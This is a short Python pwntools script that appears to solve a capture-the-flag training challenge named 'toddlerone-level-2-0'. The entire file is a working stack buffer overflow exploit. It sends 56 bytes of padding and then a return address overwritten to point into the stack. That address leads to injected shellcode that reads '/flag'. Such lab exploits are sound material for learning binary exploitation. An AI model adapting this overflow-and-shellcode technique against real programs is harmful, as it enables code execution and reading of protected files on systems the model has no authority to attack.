#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-2-0')

buff_len = 56
io = elf.process()
buff_addr = p64(0x7fffffffd690)
print(buff_addr)

SHELLCODE = asm(shellcraft.cat("/flag"))
PADDING = b'A'*(buff_len)
buff_addr = p64(0x7fffffffd6a0 + buff_len + 8)
PAYLOAD = PADDING + buff_addr + SHELLCODE 

io.sendline(f"{len(PAYLOAD)}")
io.sendline(PAYLOAD)
io.interactive()